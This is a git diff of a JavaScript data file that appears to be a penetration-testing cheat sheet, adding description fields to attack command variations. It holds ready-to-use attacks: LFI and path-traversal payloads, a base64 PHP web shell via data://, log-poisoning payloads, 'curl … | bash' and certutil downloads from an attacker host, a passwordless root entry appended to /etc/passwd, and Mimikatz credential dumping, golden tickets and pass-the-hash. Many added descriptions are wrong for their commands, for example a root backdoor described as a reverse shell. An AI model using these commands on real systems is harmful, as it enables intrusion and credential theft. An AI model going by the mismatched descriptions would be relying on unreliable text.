+          "command": "C:\\Windows\\System32\\drivers\\etc\\hosts\nC:\\Windows\\win.ini\nC:\\Windows\\System32\\config\\SAM\nC:\\inetpub\\wwwroot\\web.config\nC:\\xampp\\apache\\conf\\httpd.conf",
+          "description": "Reads the hosts file for custom hostname-to-IP mappings. Reveals internal hostnames, development servers, and network topology that DNS queries might not show."
         },
         {
           "label": "PHP filter (source)",
-          "command": "php://filter/convert.base64-encode/resource=index.php\nphp://filter/convert.base64-encode/resource=/var/www/html/config.php"
+          "command": "php://filter/convert.base64-encode/resource=index.php\nphp://filter/convert.base64-encode/resource=/var/www/html/config.php",
+          "description": "PHP wrapper payload for LFI exploitation. Uses PHP stream wrappers to read source code (php://filter), inject code (php://input), or execute data URIs."
         }
       ],
       "opsec": "moderate",
@@ -71205,7 +71645,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Path truncation (PHP < 5.3) - pad past limit",
-          "command": "http://<ip>:<port>/index.php?language=../../../../etc/passwd/./././././[REPEAT ~2048x]"
+          "command": "http://<ip>:<port>/index.php?language=../../../../etc/passwd/./././././[REPEAT ~2048x]",
+          "description": "Path truncation (PHP < 5.3) - pad past limit. See the command syntax for exact parameters and flags."
         }
       ],
       "exam": "exam-ok",
@@ -71508,11 +71949,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "base64-encode source to read PHP",
-          "command": "http://<ip>:<port>/index.php?language=php://filter/convert.base64-encode/resource=<file>"
+          "command": "http://<ip>:<port>/index.php?language=php://filter/convert.base64-encode/resource=<file>",
+          "description": "Base64-encode source to read PHP. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Chain (php_filter_chain) to RCE",
-          "command": "# php_filter_chain_generator.py --chain '<?php system($_GET[0]);?>'"
+          "command": "# php_filter_chain_generator.py --chain '<?php system($_GET[0]);?>'",
+          "description": "Chain (php_filter_chain) to RCE. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -71593,23 +72036,28 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "URL-encoded",
-          "command": "http://<ip>:<port>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64"
+          "command": "http://<ip>:<port>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
+          "description": "URL-encoded path traversal payload. Bypasses basic LFI filters by encoding the dot-dot-slash sequence in the URL."
         },
         {
           "label": "Double URL-encoded (WAF bypass)",
-          "command": "http://<ip>:<port>/index.php?language=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+          "command": "http://<ip>:<port>/index.php?language=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+          "description": "Double URL-encoded (WAF bypass). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Approved path prefix",
-          "command": "http://<ip>:<port>/index.php?language=./languages/../../../../etc/passwd"
+          "command": "http://<ip>:<port>/index.php?language=./languages/../../../../etc/passwd",
+          "description": "Local File Inclusion (LFI) / path traversal payload. Traverses directories to read sensitive files outside the web root through a vulnerable file inclusion parameter."
         },
         {
           "label": "Glob pattern bypass (PHP regex/filter on literal dots)",
-          "command": "cat .?/.*/.?/etc/passwd"
+          "command": "cat .?/.*/.?/etc/passwd",
+          "description": "Glob pattern bypass (PHP regex/filter on literal dots). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Glob bypass - PHP interactive shell test",
-          "command": "php -a\necho file_get_contents('.?/.*/.?/etc/passwd');"
+          "command": "php -a\necho file_get_contents('.?/.*/.?/etc/passwd');",
+          "description": "Glob bypass - PHP interactive shell test. See the command syntax for exact parameters and flags."
         }
       ],
       "opsec": "loud",
@@ -71993,7 +72441,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "base64 data wrapper",
-          "command": "curl -s 'http://<ip>:<port>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==&0=id'"
+          "command": "curl -s 'http://<ip>:<port>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==&0=id'",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Turns LFI into remote code execution by inlining a base64 PHP web shell through the data:// wrapper.:\n  -s http://<ip>:<port>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=idSSL / secret / source\n  <ip>                     target IP address\nThe base64 blob is <?php system($_GET[\"cmd\"]); ?> - regenerate with: echo '<?php system($_GET[\"cmd\"]); ?>' | base64."
@@ -73376,11 +73825,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "SSH auth.log poisoning",
-          "command": "ssh '<?php system($_GET[0]); ?>'@<ip>   # then include /var/log/auth.log"
+          "command": "ssh '<?php system($_GET[0]); ?>'@<ip>   # then include /var/log/auth.log",
+          "description": "Connects to a remote host via SSH. Provides encrypted shell access and can create tunnels for pivoting."
         },
         {
           "label": "Apache access log via User-Agent",
-          "command": "curl -s http://<ip>/ -H 'User-Agent: <?php system($_GET[0]); ?>'"
+          "command": "curl -s http://<ip>/ -H 'User-Agent: <?php system($_GET[0]); ?>'",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         }
       ],
       "steps": [
@@ -73728,15 +74179,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Proxy with a custom listen port",
-          "command": "./proxy -selfcert -laddr 0.0.0.0:443"
+          "command": "./proxy -selfcert -laddr 0.0.0.0:443",
+          "description": "Proxy with a custom listen port. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Agent over an allowed egress port (443)",
-          "command": "./agent -connect <attacker_ip>:443 -ignore-cert"
+          "command": "./agent -connect <attacker_ip>:443 -ignore-cert",
+          "description": "Agent over an allowed egress port (443). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Add another internal route (double pivot)",
-          "command": "sudo ip route add <second_subnet>/24 dev ligolo"
+          "command": "sudo ip route add <second_subnet>/24 dev ligolo",
+          "description": "Uses Ligolo for creating tunnels and pivoting to internal networks. Provides a virtual network interface on the attacker side for seamless access to internal subnets."
         }
       ],
       "type": "command",
@@ -74057,11 +74511,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Crack with John",
-          "command": "john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.hashes"
+          "command": "john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.hashes",
+          "description": "Cracks password hashes with John the Ripper. Supports auto-detection of hash types, wordlist attacks, and custom rules. CPU-based but versatile with broad format support."
         },
         {
           "label": "hashcat (sha512crypt m1800)",
-          "command": "hashcat -m 1800 unshadowed.hashes /usr/share/wordlists/rockyou.txt"
+          "command": "hashcat -m 1800 unshadowed.hashes /usr/share/wordlists/rockyou.txt",
+          "description": "Cracks password hashes with hashcat (mode 1800) using GPU acceleration. Supports wordlists, rules, masks, and hybrid attacks for maximum cracking efficiency."
         }
       ],
       "steps": [
@@ -74106,11 +74562,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Spot the auth daemon (SSSD / winbind)",
-          "command": "ps -ef | grep -iE 'winbind|sssd'"
+          "command": "ps -ef | grep -iE 'winbind|sssd'",
+          "description": "Spot the auth daemon (SSSD / winbind). See the command syntax for exact parameters and flags."
         },
         {
           "label": "SSSD cached credential DB (crack offline)",
-          "command": "ls -la /var/lib/sss/db/ ; # cache_<domain>.ldb holds cached hashes"
+          "command": "ls -la /var/lib/sss/db/ ; # cache_<domain>.ldb holds cached hashes",
+          "description": "SSSD cached credential DB (crack offline). See the command syntax for exact parameters and flags."
         }
       ],
       "notes": "A domain-joined Linux host lets you pivot to AD: SSSD caches the last logon's credential material in /var/lib/sss/db/cache_*.ldb (crackable), and you can SSH with a UPN (`ssh 'user@domain@host'`). Check /etc/krb5.conf and /etc/sssd/sssd.conf for the realm.\nAlso covered in: OSCP PEN-200 Chapter 19 (Password Attacks)",
@@ -74331,15 +74789,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "wget / curl to disk",
-          "command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh\ncurl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
+          "command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh\ncurl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         },
         {
           "label": "Fileless (pipe to interpreter)",
-          "command": "curl https://<ip>/LinEnum.sh | bash\nwget -qO- https://<ip>/helloworld.py | python3"
+          "command": "curl https://<ip>/LinEnum.sh | bash\nwget -qO- https://<ip>/helloworld.py | python3",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         },
         {
           "label": "bash /dev/tcp (no wget/curl)",
-          "command": "exec 3<>/dev/tcp/<lhost>/80\necho -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\">&3\ncat <&3"
+          "command": "exec 3<>/dev/tcp/<lhost>/80\necho -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\">&3\ncat <&3",
+          "description": "Runs an automated privilege escalation enumeration tool. Checks for common misconfigurations and privesc vectors."
         }
       ],
       "opsec": "quiet",
@@ -74646,7 +75107,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Bash version",
-          "command": "sudo bash mimipenguin.sh"
+          "command": "sudo bash mimipenguin.sh",
+          "description": "Runs a command with elevated (root) privileges via sudo. Leverages sudo permissions identified from the sudo -l enumeration."
         }
       ],
       "explain": "Harvests cleartext credentials of logged-in users from Linux process memory:\n  sudo python3 mimipenguin.py   scan memory (display managers, sudo, etc.) for plaintext passwords\nNeeds root because it reads other processes' memory - the Linux analogue of dumping LSASS. A shell (.sh) version exists for hosts without Python."
@@ -74909,23 +75371,28 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Config Files",
-          "command": "for l in $(echo \".conf .config .cnf\");do find / -name *$l 2>/dev/null | grep -v \"lib\\|fonts\\|share\\|core\";done"
+          "command": "for l in $(echo \".conf .config .cnf\");do find / -name *$l 2>/dev/null | grep -v \"lib\\|fonts\\|share\\|core\";done",
+          "description": "Bash loop automating a repetitive operation across multiple targets or values. Useful for batch enumeration when purpose-built tools are unavailable."
         },
         {
           "label": "Database Files",
-          "command": "for l in $(echo \".sql .db .*db .db*\");do find / -name *$l 2>/dev/null | grep -v \"doc\\|lib\\|headers\\|share\\|man\";done"
+          "command": "for l in $(echo \".sql .db .*db .db*\");do find / -name *$l 2>/dev/null | grep -v \"doc\\|lib\\|headers\\|share\\|man\";done",
+          "description": "Bash loop automating a repetitive operation across multiple targets or values. Useful for batch enumeration when purpose-built tools are unavailable."
         },
         {
           "label": "Notes / Scripts",
-          "command": "find /home/* -type f -name \"*.txt\" -o ! -name \"*.*\""
+          "command": "find /home/* -type f -name \"*.txt\" -o ! -name \"*.*\"",
+          "description": "Searches the filesystem for configuration files that may contain credentials. Common hiding places for passwords, database connection strings, and API keys."
         },
         {
           "label": "History / Cron",
-          "command": "tail -n5 /home/*/.bash*\ncat /etc/crontab\nls -la /etc/cron.*/"
+          "command": "tail -n5 /home/*/.bash*\ncat /etc/crontab\nls -la /etc/cron.*/",
+          "description": "Lists scheduled cron jobs. Cron jobs running as root with writable scripts or paths are a common privilege escalation vector."
         },
         {
           "label": "Auth Log Grep",
-          "command": "for i in $(ls /var/log/* 2>/dev/null); do GREP=$(grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND=\" $i 2>/dev/null); if [[ $GREP ]]; then echo -e \"\n#### Log file: \" $i; grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND=\" $i 2>/dev/null; fi; done"
+          "command": "for i in $(ls /var/log/* 2>/dev/null); do GREP=$(grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND=\" $i 2>/dev/null); if [[ $GREP ]]; then echo -e \"\n#### Log file: \" $i; grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND=\" $i 2>/dev/null; fi; done",
+          "description": "Bash loop automating a repetitive operation across multiple targets or values. Useful for batch enumeration when purpose-built tools are unavailable."
         }
       ],
       "opsec": "quiet",
@@ -75132,19 +75599,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Use ccache",
-          "command": "cp /tmp/krb5cc_* .\nexport KRB5CCNAME=$PWD/krb5cc_*\nklist"
+          "command": "cp /tmp/krb5cc_* .\nexport KRB5CCNAME=$PWD/krb5cc_*\nklist",
+          "description": "Copies files to a different location. Used post-exploitation to stage tools, backup files before modification, or copy sensitive files for exfiltration."
         },
         {
           "label": "kinit from keytab",
-          "command": "kinit <user>@<realm> -k -t <keytab>"
+          "command": "kinit <user>@<realm> -k -t <keytab>",
+          "description": "Requests a Kerberos TGT from the Linux command line using kinit. Authenticates with a password or keytab file and caches the ticket for use with Kerberos-aware tools."
         },
         {
           "label": "SMB with Kerberos",
-          "command": "smbclient //dc01/<share> -k -c ls -no-pass"
+          "command": "smbclient //dc01/<share> -k -c ls -no-pass",
+          "description": "Executes an SMB command non-interactively. Useful for scripting file downloads/uploads or share access checks in automated workflows."
         },
         {
           "label": "Convert ccache to kirbi",
-          "command": "impacket-ticketConverter <ccache> <ticket>"
+          "command": "impacket-ticketConverter <ccache> <ticket>",
+          "description": "Uses Impacket ticketConverter to convert Kerberos tickets between ccache (Linux/Impacket) and kirbi (Windows/Rubeus) formats. Needed when moving tickets between Linux and Windows attack tools."
         }
       ],
       "opsec": "loud",
@@ -75329,11 +75800,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Download from remote",
-          "command": "scp <user>@<lhost>:/root/myroot.txt ."
+          "command": "scp <user>@<lhost>:/root/myroot.txt .",
+          "description": "Transfers files over SSH using scp. Securely copies files between your attack machine and the target - useful for uploading tools or exfiltrating data."
         },
         {
           "label": "Upload to remote",
-          "command": "scp /etc/passwd <user>@<ip>:/home/<user>/"
+          "command": "scp /etc/passwd <user>@<ip>:/home/<user>/",
+          "description": "Transfers files over SSH using scp. Securely copies files between your attack machine and the target - useful for uploading tools or exfiltrating data."
         }
       ],
       "opsec": "quiet",
@@ -75659,9 +76132,9 @@ const COMMAND_DATA = {
           "label": "POST upload - multi-file (HTTPS)"
         },
         {
-          "description": "SCP upload (push file to remote)",
           "command": "scp /etc/passwd <user>@<ip>:/home/<user>/",
-          "label": "scp upload"
+          "label": "scp upload",
+          "description": "Transfers files over SSH using scp. Securely copies files between your attack machine and the target - useful for uploading tools or exfiltrating data."
         },
         {
           "description": "Alternative web upload - python3 requests one-liner",
@@ -75710,7 +76183,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Passwordless root entry (empty second field bypasses password check)",
-          "command": "echo \"root3::0:0:root:/root:/bin/bash\" >> /etc/passwd\nsu root3\n# No password required - instant root"
+          "command": "echo \"root3::0:0:root:/root:/bin/bash\" >> /etc/passwd\nsu root3\n# No password required - instant root",
+          "description": "Bash reverse shell one-liner. Target connects back to your listener - works through NAT and most firewalls."
         }
       ],
       "tools_used": [
@@ -75941,23 +76415,28 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "certutil",
-          "command": "certutil.exe -urlcache -split -f http://<lhost>:8000/nc.exe\ncertutil.exe -verifyctl -split -f http://<lhost>:8000/nc.exe"
+          "command": "certutil.exe -urlcache -split -f http://<lhost>:8000/nc.exe\ncertutil.exe -verifyctl -split -f http://<lhost>:8000/nc.exe",
+          "description": "Uses certutil to download a file from a URL. Certutil is a signed Windows binary (LOLBin) that can fetch files while appearing as legitimate certificate operations."
         },
         {
           "label": "bitsadmin / Start-BitsTransfer",
-          "command": "bitsadmin /transfer wcb /priority foreground http://<lhost>:8000/nc.exe C:\\Users\\<user>\\Desktop\\nc.exe\nImport-Module bitstransfer; Start-BitsTransfer -Source \"http://<lhost>:8000/nc.exe\" -Destination \"C:\\Windows\\Temp\\nc.exe\""
+          "command": "bitsadmin /transfer wcb /priority foreground http://<lhost>:8000/nc.exe C:\\Users\\<user>\\Desktop\\nc.exe\nImport-Module bitstransfer; Start-BitsTransfer -Source \"http://<lhost>:8000/nc.exe\" -Destination \"C:\\Windows\\Temp\\nc.exe\"",
+          "description": "Bitsadmin / Start-BitsTransfer. See the command syntax for exact parameters and flags."
         },
         {
           "label": "certreq upload",
-          "command": "certreq.exe -Post -config http://<lhost>:8000/ c:\\windows\\win.ini   # attacker: sudo nc -lvnp 8000"
+          "command": "certreq.exe -Post -config http://<lhost>:8000/ c:\\windows\\win.ini   # attacker: sudo nc -lvnp 8000",
+          "description": "Uses certreq.exe (a signed Windows binary) to download files via HTTP. LOLBin technique that bypasses application whitelisting since certreq is a legitimate system tool."
         },
         {
           "label": "GfxDownloadWrapper",
-          "command": "GfxDownloadWrapper.exe \"http://<lhost>/mimikatz.exe\" \"C:\\Temp\\nc.exe\""
+          "command": "GfxDownloadWrapper.exe \"http://<lhost>/mimikatz.exe\" \"C:\\Temp\\nc.exe\"",
+          "description": "Uses Intel's GfxDownloadWrapper.exe as a LOLBin to download files. Legitimate Intel utility abused for payload downloads that bypass application whitelisting."
         },
         {
           "label": "Linux openssl (encrypted channel)",
-          "command": "# attacker: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem\n#           openssl s_server -quiet -accept 80 -cert cert.pem -key key.pem < /tmp/LinEnum.sh\n# target:   openssl s_client -connect <ip>:80 -quiet > LinEnum.sh"
+          "command": "# attacker: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem\n#           openssl s_server -quiet -accept 80 -cert cert.pem -key key.pem < /tmp/LinEnum.sh\n# target:   openssl s_client -connect <ip>:80 -quiet > LinEnum.sh",
+          "description": "Node.js reverse shell one-liner. Target connects back to your listener - works through NAT and most egress firewalls if the port is allowed."
         }
       ],
       "opsec": "quiet",
@@ -76695,7 +77174,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Clone and compile logrotten if binary not available",
-          "command": "git clone https://github.com/whotwagner/logrotten.git\ncd logrotten && gcc logrotten.c -o logrotten"
+          "command": "git clone https://github.com/whotwagner/logrotten.git\ncd logrotten && gcc logrotten.c -o logrotten",
+          "description": "Clone and compile logrotten if binary not available. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Exploits vulnerable logrotate (run as root) racing on a log you can write:\n  ./logrotten              win the rename race to execute a payload as root\n  -p ./payload             the payload script to run (often dropped into /etc/bash_completion.d)\n  <writable_log>           the log file logrotate rotates that you can append to\nCheck logrotate --version (3.8.6/3.11.0/3.15.0/3.18.0 vulnerable) and spam writes to the log to trigger rotation."
@@ -76898,11 +77378,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Null session",
-          "command": "lookupsid.py <domain>/@<dc_ip> -no-pass"
+          "command": "lookupsid.py <domain>/@<dc_ip> -no-pass",
+          "description": "Uses Impacket lookupsid to enumerate domain users and groups by brute-forcing SID values. Works through null sessions or with credentials - effective when other enumeration methods are blocked."
         },
         {
           "label": "Brute RID range",
-          "command": "lookupsid.py <domain>/<user>:<password>@<dc_ip> 10000"
+          "command": "lookupsid.py <domain>/<user>:<password>@<dc_ip> 10000",
+          "description": "Uses Impacket lookupsid to enumerate domain users and groups by brute-forcing SID values. Works through null sessions or with credentials - effective when other enumeration methods are blocked."
         }
       ],
       "steps": [
@@ -77768,11 +78250,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Test empty / username-as-password",
-          "command": "medusa -h <host> -U <userlist> -e ns -M web-form -m FORM:\"<params>:F=<fail_text>\""
+          "command": "medusa -h <host> -U <userlist> -e ns -M web-form -m FORM:\"<params>:F=<fail_text>\"",
+          "description": "Test empty / username-as-password. See the command syntax for exact parameters and flags."
         },
         {
           "label": "HTTP basic auth",
-          "command": "medusa -h <host> -u <user> -P <wordlist> -M http -m DIR:/protected"
+          "command": "medusa -h <host> -u <user> -P <wordlist> -M http -m DIR:/protected",
+          "description": "Uses Medusa for parallel online password brute-forcing. Similar to Hydra but supports simultaneous attacks against multiple hosts."
         }
       ],
       "explain": "Medusa's web-form module brute forces HTTP login forms, an alternative to Hydra's http-post-form.:\n  -U <userlist>            username\n  -P <wordlist>            password\n  -m FORM:\"<params>:F=<fail_text>\"module / mode\n  <wordlist>               path to wordlist file\nmedusa's web-form module is an alternative to hydra http-post-form - specify the form fields and the failure string."
@@ -80732,7 +81216,7 @@ const COMMAND_DATA = {
         {
           "label": "Interact",
           "command": "sessions -i <session>",
-          "description": "Interact with a session by ID"
+          "description": "Lists or interacts with active Metasploit sessions. Manages open Meterpreter, shell, and VNC sessions across multiple compromised targets."
         },
         {
           "label": "Background Current",
@@ -81481,7 +81965,7 @@ const COMMAND_DATA = {
         {
           "label": "Kill All",
           "command": "jobs -K",
-          "description": "Kill all running jobs"
+          "description": "Lists running Metasploit background jobs. Shows active exploits, handlers, and auxiliary modules running in the background."
         }
       ],
       "opsec": "loud",
@@ -81938,12 +82422,12 @@ const COMMAND_DATA = {
         {
           "label": "List",
           "command": "show payloads",
-          "description": "Set the payload for current exploit module"
+          "description": "Lists all payloads available for the current exploit module in Metasploit. Shows compatible payload options that match the target architecture and platform."
         },
         {
           "label": "Filter",
           "command": "grep meterpreter show payloads",
-          "description": "Show all compatible payloads for current module"
+          "description": "Filters the payload list by keyword in Metasploit. Narrows down compatible payloads by searching for specific terms (e.g., meterpreter, reverse, staged)."
         },
         {
           "label": "Chain Filters",
@@ -82319,7 +82803,7 @@ const COMMAND_DATA = {
         {
           "label": "Set",
           "command": "set target <index>",
-          "description": "Set specific target version"
+          "description": "Sets the exploit target index in Metasploit. Different target indices correspond to different OS versions, architectures, or exploitation methods for the selected module."
         }
       ],
       "opsec": "loud",
@@ -82621,7 +83105,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Pass-the-hash check",
-          "command": "set SMBPass <nt_hash>; set SMBUser administrator; run"
+          "command": "set SMBPass <nt_hash>; set SMBUser administrator; run",
+          "description": "Configures a Metasploit SMB module for pass-the-hash authentication. Tests whether a stolen NTLM hash grants access to target machines without the plaintext password."
         }
       ],
       "steps": [
@@ -82960,12 +83445,12 @@ const COMMAND_DATA = {
         {
           "label": "Switch",
           "command": "workspace <name>",
-          "description": "Switch to a workspace"
+          "description": "Manages Metasploit workspaces to organize data from different engagements. Isolates scan results, hosts, and credentials per target environment."
         },
         {
           "label": "Delete",
           "command": "workspace -d <name>",
-          "description": "Delete a workspace"
+          "description": "Manages Metasploit workspaces to organize data from different engagements. Isolates scan results, hosts, and credentials per target environment."
         }
       ],
       "opsec": "loud",
@@ -83984,11 +84469,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Smart hashdump (post module)",
-          "command": "run post/windows/gather/smart_hashdump"
+          "command": "run post/windows/gather/smart_hashdump",
+          "description": "Smart hashdump (post module). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Load kiwi + dump",
-          "command": "load kiwi; creds_all"
+          "command": "load kiwi; creds_all",
+          "description": "Loads an extension into an active Meterpreter session (e.g., kiwi for Mimikatz, incognito for token manipulation). Adds additional capabilities without uploading new tools."
         }
       ],
       "steps": [
@@ -84316,11 +84803,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Dump SAM",
-          "command": "lsa_dump_sam"
+          "command": "lsa_dump_sam",
+          "description": "Dumps local SAM database hashes using a Meterpreter module. Extracts NTLM hashes for local accounts on the compromised machine."
         },
         {
           "label": "Dump Secrets",
-          "command": "lsa_dump_secrets"
+          "command": "lsa_dump_secrets",
+          "description": "Dumps LSA secrets using a Meterpreter module. Extracts cached domain credentials, service account passwords, and DPAPI secrets."
         }
       ],
       "opsec": "loud",
@@ -84711,7 +85200,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Reverse",
-          "command": "portfwd add -R -l <local_port> -p <remote_port> -L <attacker_ip>"
+          "command": "portfwd add -R -l <local_port> -p <remote_port> -L <attacker_ip>",
+          "description": "Creates a port forward through a Meterpreter session. Routes traffic through the compromised host to reach internal services that are not directly accessible."
         }
       ],
       "recommended": [
@@ -85483,11 +85973,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "SharpChrome (offline-friendly)",
-          "command": ".\\SharpChrome.exe logins /unprotect"
+          "command": ".\\SharpChrome.exe logins /unprotect",
+          "description": "SharpChrome (offline-friendly). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Also grab cookies",
-          "command": ".\\SharpChrome.exe cookies /unprotect"
+          "command": ".\\SharpChrome.exe cookies /unprotect",
+          "description": "Extracts saved passwords, cookies, and browsing data from Google Chrome. Decrypts Chrome's credential store using DPAPI keys from the current user context."
         }
       ],
       "steps": [
@@ -85985,11 +86477,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "DPAPI vault creds",
-          "command": "vault::cred /patch"
+          "command": "vault::cred /patch",
+          "description": "Lists credentials stored in the Windows Credential Vault using Mimikatz. Extracts saved web, network, and certificate-based credentials."
         },
         {
           "label": "Enumerate DPAPI master keys",
-          "command": "sekurlsa::dpapi"
+          "command": "sekurlsa::dpapi",
+          "description": "Enumerate DPAPI master keys. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -86218,11 +86712,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Inject directly (ptt)",
-          "command": "kerberos::golden /user:<user> /domain:<child_domain> /sid:<child_sid> /krbtgt:<child_krbtgt_hash> /sids:<parent_ea_sid> /ptt"
+          "command": "kerberos::golden /user:<user> /domain:<child_domain> /sid:<child_sid> /krbtgt:<child_krbtgt_hash> /sids:<parent_ea_sid> /ptt",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Save to file instead",
-          "command": "kerberos::golden /user:<user> /domain:<child_domain> /sid:<child_sid> /krbtgt:<child_krbtgt_hash> /sids:<parent_ea_sid> /ticket:golden.kirbi"
+          "command": "kerberos::golden /user:<user> /domain:<child_domain> /sid:<child_sid> /krbtgt:<child_krbtgt_hash> /sids:<parent_ea_sid> /ticket:golden.kirbi",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "steps": [
@@ -86314,12 +86810,14 @@ const COMMAND_DATA = {
         {
           "command": "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<nt_hash> /run:powershell",
           "caption": "PTH: spawn PowerShell instead of cmd.exe",
-          "label": "PtH -> PowerShell"
+          "label": "PtH -> PowerShell",
+          "description": "Performs Pass-the-Hash by spawning a new process with stolen NTLM hash credentials. Creates an authenticated session without knowing the plaintext password."
         },
         {
           "command": "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<nt_hash> /run:\"mmc.exe -s\"",
           "caption": "PTH: spawn MMC for GUI lateral movement",
-          "label": "PtH -> MMC console"
+          "label": "PtH -> MMC console",
+          "description": "Performs Pass-the-Hash by spawning a new process with stolen NTLM hash credentials. Creates an authenticated session without knowing the plaintext password."
         }
       ],
       "defense": {
@@ -86554,15 +87052,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Export Tickets",
-          "command": "privilege::debug\nsekurlsa::tickets /export"
+          "command": "privilege::debug\nsekurlsa::tickets /export",
+          "description": "Exports all Kerberos tickets from LSASS memory. Captures TGTs and service tickets for pass-the-ticket attacks or offline analysis."
         },
         {
           "label": "Extract Keys",
-          "command": "privilege::debug\nsekurlsa::ekeys"
+          "command": "privilege::debug\nsekurlsa::ekeys",
+          "description": "Enables SeDebugPrivilege in the current process. Required before most Mimikatz credential-dumping operations as it grants access to other processes' memory (LSASS)."
         },
         {
           "label": "OverPass the Hash",
-          "command": "sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<nt_hash>"
+          "command": "sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<nt_hash>",
+          "description": "Performs Pass-the-Hash by spawning a new process with stolen NTLM hash credentials. Creates an authenticated session without knowing the plaintext password."
         }
       ],
       "opsec": "loud",
@@ -86758,15 +87259,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "One-shot: patch both providers + export both stores",
-          "command": "Invoke-Mimikatz -Command '\"crypto::capi\" \"crypto::cng\" \"crypto::certificates /export\" \"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE\"'"
+          "command": "Invoke-Mimikatz -Command '\"crypto::capi\" \"crypto::cng\" \"crypto::certificates /export\" \"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE\"'",
+          "description": "Runs Mimikatz operations via reflective PowerShell loading - executes entirely in memory without writing to disk."
         },
         {
           "label": "Native mimikatz.exe (via Loader, in-memory)",
-          "command": "Loader.exe -path C:\\AD\\Tools\\mimikatz.exe -args crypto::capi crypto::cng \"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE\" exit"
